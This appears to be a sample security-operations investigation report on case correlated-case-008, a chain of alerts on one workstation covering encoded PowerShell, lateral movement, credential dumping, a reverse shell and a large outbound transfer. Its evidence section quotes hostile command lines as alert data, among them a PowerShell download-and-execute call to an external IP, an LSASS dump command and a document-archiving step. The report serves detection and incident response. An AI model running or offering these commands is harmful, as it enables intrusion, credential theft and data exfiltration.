> **Note:** live agent runs are currently blocked (see `devlog/0009-pausing-live-agent-verification.md`).
> Every piece of evidence in this report is real project data -- the case is from actually running
> `correlate()`, enrichment figures are real live results (VirusTotal/AbuseIPDB from
> `devlog/0002-week2-enrichment.md`, or a real `found: false` VirusTotal response where applicable), asset
> context is the real `data/asset_inventory.json` entry, and any MITRE match is the real Week 5 TF-IDF
> retriever's actual output for that exact query -- not cherry-picked. Only the verdict itself (severity,
> confidence, reasoning, recommended action) is hand-authored, standing in for what a live model would
> produce, so the *report format* can be reviewed now.

---

# Investigation Report — correlated-case-008

**8 alert(s)**, 2026-08-20T14:03:11+00:00 to 2026-08-20T14:20:05+00:00 · investigated in 2 iteration(s)

- **Hosts**: WKS-EU-0231
- **Users**: jsmith
- **IPs**: 10.20.4.55, 10.20.4.90, 185.220.101.47, 8.8.8.8
- **File hashes**: 4c297b0b5335bbc2..., 8dd4f534079fd335..., ef1b08f1882961ff...

## Verdict

**CRITICAL** · confidence 88/100

**Recommended action**: recommend escalate urgent
**MITRE ATT&CK**: T1059.001, T1583.002, T1003.001, T1053.005

This case is an 8-alert chain on WKS-EU-0231 spanning encoded PowerShell execution, DNS activity, SMB lateral movement, scheduled-task persistence, LSASS credential dumping, a PowerShell reverse shell, archive staging, and a large outbound transfer -- consistent with a full intrusion lifecycle on a single host rather than isolated noise. The destination IP 185.220.101.47 is confirmed malicious by both sources: VirusTotal flags it 15/91, and AbuseIPDB reports 100% abuse confidence with 132 reports and Tor-exit status. The affected host is not a routine workstation: asset context confirms it belongs to IT Operations with local admin rights on multiple servers, meaningfully raising the impact of compromise. Overall severity and recommended action are based primarily on the IP reputation, asset criticality, and the coherence of the alert chain itself, not on the MITRE mapping alone: search_mitre returned a confident match (score >= 0.25) for only 4 of the chain's 8 alerts, listed below. The remaining alerts' technique mappings were too weak to cite with confidence (sig-0006 scored only 0.21 for T1070.005 (Network Share Connection Removal); edr-9002 scored only 0.22 for T1134.004 (Parent PID Spoofing); edr-9006 scored only 0.17 for T1027.015 (Compression); sig-0009 scored only 0.12 for T1105 (Ingress Tool Transfer)) -- included here for transparency, not treated as confirmed.

### Key evidence
- VirusTotal: 15/91 engines flag 185.220.101.47 as malicious
- AbuseIPDB: 100% abuse confidence, 132 reports, confirmed Tor exit node
- Asset context: WKS-EU-0231 has admin rights on multiple servers (IT Operations)
- search_mitre confirmed T1059.001 (PowerShell) for sig-0001, score 0.31
- search_mitre confirmed T1583.002 (DNS Server) for sig-0004, score 0.35
- search_mitre confirmed T1003.001 (LSASS Memory) for edr-9001, score 0.30
- search_mitre confirmed T1053.005 (Scheduled Task) for sig-0007, score 0.40

## Evidence gathered

- **enrich_ip**(ip=185.220.101.47): VT 15/91 malicious; AbuseIPDB 100% confidence
- **get_asset_context**(hostname=WKS-EU-0231): high-criticality, owner=jsmith
- **search_mitre**(query=Suspicious PowerShell Encoded Command. PowerShell executed with a base64-encoded command line, a common technique to obscure malicious payloads from casual log review.): top match T1059.001 PowerShell (score 0.31)
- **search_mitre**(query=DNS Query to Known DGA-Pattern Domain. Outbound DNS query observed for a domain matching algorithmically-generated-domain heuristics, associated with C2 beaconing.): top match T1583.002 DNS Server (score 0.35)
- **search_mitre**(query=Credential Dumping Tool Signature Match. Process behavior consistent with LSASS memory access for credential extraction (Mimikatz-family signature). Process: lsass_dump.exe Command line: lsass_dump.exe --pid 812 --out C:\Windows\Temp\creds.bin): top match T1003.001 LSASS Memory (score 0.30)
- **search_mitre**(query=SMB Lateral Movement Pattern. Host initiated SMB admin-share connections to 6 distinct internal hosts within 2 minutes, a pattern consistent with lateral movement tooling.): top match T1070.005 Network Share Connection Removal (score 0.21)
- **search_mitre**(query=Scheduled Task Created via schtasks.exe. A new scheduled task was created via schtasks.exe with a suspicious binary path referencing a temp directory.): top match T1053.005 Scheduled Task (score 0.40)
- **search_mitre**(query=Reverse Shell Network Behavior. Outbound connection from an uncommon parent process to an external IP with shell-like bidirectional traffic pattern. Process: powershell.exe Command line: powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.47/stage2.ps1')): top match T1134.004 Parent PID Spoofing (score 0.22)
- **search_mitre**(query=Archive Utility Compressing Large Directory. 7z.exe observed compressing a large portion of a user's document directory shortly before a large outbound transfer, consistent with staging for exfiltration. Process: 7z.exe Command line: 7z.exe a -p C:\Windows\Temp\archive.7z C:\Users\jsmith\Documents\*): top match T1027.015 Compression (score 0.17)
- **search_mitre**(query=Large Outbound Data Transfer. Host transferred 2.3 GB to an external IP over a single connection, well above baseline for this asset class.): top match T1105 Ingress Tool Transfer (score 0.12)
